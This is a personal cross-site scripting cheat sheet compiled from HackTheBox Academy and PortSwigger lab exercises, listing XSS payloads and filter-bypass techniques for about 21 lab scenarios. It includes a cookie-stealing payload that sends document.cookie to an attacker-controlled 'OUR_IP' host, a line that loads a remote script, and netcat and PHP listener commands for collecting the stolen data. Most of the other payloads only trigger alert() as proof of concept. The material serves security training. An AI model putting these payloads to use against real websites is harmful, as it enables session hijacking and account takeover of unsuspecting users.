# HTB cheatsheet


`"><svg/onload=confirm(1)>`

## XSS Payloads

| Code | Description |
|------|-------------|
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |

## Load External Script

| Code | Description |
|------|-------------|
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |

## Steal Cookies

| Code | Description |
|------|-------------|
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send cookie details to us |

## Commands

| Command | Description |
|---------|-------------|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run XSStrike on a URL parameter |
| `sudo nc -lvnp 80` | Start netcat listener |
| `sudo php -S 0.0.0.0:80` | Start PHP server |


# PortSwigger cheatsheet

1. Reflected XSS into HTML context with nothing encoded

`<script>alert()</script>`

2. DOM XSS in document.write sink using source location.search

```txt
**source** "><img src=x onerror=alert()>
```

3. DOM XSS in innerHTML sink using source location.search

`<img src=1 onerror=alert()>`

4. DOM XSS in jQuery anchor href attribute sink using location.search source

```txt
**https://something.../feedback?returnPath=** javascript:alert()
```

5. DOM XSS in jQuery selector sink using a hashchange event

```txt
https://something.../#hashname<img src=x onerror=alert()>

<iframe src="https://something.../#" onload = "this.src = this.src + '%3Cimg%20src=x%20onerror=print()%3E'">
```

6. Reflected XSS into attribute with angle brackets HTML-encoded

```txt
**search result: 0 search results for** asd" onmouseover="alert()

<input type="text" placeholder="Search the blog..." name="search" value="asd" onmouseover="alert()">
```

7. DOM XSS in document.write sink using source location.search inside a select element

```txt
**original url:** https://.../product?productId=3

**payload**: https://.../product?productId=3&storeId="</select><img src=x onerror=alert()>

(`&` to interact with target script code. `storeId` is a var of target script. `</select>` to escape)
```

8. Simple Stored DOM XSS

`asd <asd> <img src=x onerror=alert()>`

(target filter out the first tag)

9. Reflected XSS into HTML context with most tags and attributes blocked

```txt
<body onresize=alert(1)>

<iframe src="https://something.../?search=%3Cbody%20onresize%3Dprint%28%29%3E" onload="this.style.width = '500px'">
```

10. Reflected XSS into HTML context with all tags blocked except custom ones

```txt
/?search=<custom id='x' tabindex=1 onfocus=alert()>asd</custom>#x

<script>
location="https://0a40002f03ef80f3c779dd7300c400f0.web-security-academy.net/?search=%3Ccustom+id%3D%27x%27+tabindex%3D1+onfocus%3Dalert(document.cookie)%3Easd%3C%2Fcustom%3E#x"
</script>
```

11. Reflected XSS with event handlers and href attributes blocked

```txt
<animate  attributeName=href values=javascript:alert() />

<svg><a><animate attributeName=href values=javascript:alert() /><text x=20 y=20>Click</text></a></svg>
```

12. Reflected XSS with some SVG markup allowed

`<svg><animateTransform onbegin=alert()>`

13. Reflected XSS into attribute with angle brackets HTML-encoded

```
0 search results for 'asd" autofocus onfocus=alert()

<input type="text" placeholder="Search the blog..." name="search" value="asd" autofocus="" onfocus="alert()>

asd" autofocus onfocus=alert()
```

14. Stored XSS into anchor href attribute with double quotes HTML-encoded:

`<a id="author" href="javascript:alert(document.domain)">asd</a>`

15. Reflected XSS in canonical link tag:

```
<link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here">


t/?test=here%09'accesskey='X'%09onclick='alert(1)

<link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here	" accesskey="X" onclick="alert(1)">
```

16. Reflected XSS into a JavaScript string with single quote and backslash escaped:

`</script><img src=x onerror=alert()>`

17. Reflected XSS into a JavaScript string with angle brackets HTML encoded

```
'-alert(document.domain)-'
';alert(document.domain)//
```

18. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

`\';alert(document.domain)//`

19. Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

```
http://foo?&apos;-alert(1)-&apos;

http://ewq.com&#39;);alert(document.domain+&#39;

<a id="author" href="http://ewq.com');alert(document.domain+'" onclick="var tracker={track(){}};tracker.track('http://ewq.com');alert(document.domain+'');">asd</a>
```

20. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

`${alert(1)}`

21. Reflected XSS in a JavaScript URL with some characters blocked

```
/post?postId=4&'},x=x=>{onerror=alert;throw/**/1337},toString=x,window+'',{'

<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{onerror%3dalert%3bthrow/**/1337},toString%3dx,window+%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>


<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4'}).finally(_ => window.location = '/')">Back to Blog</a>
```












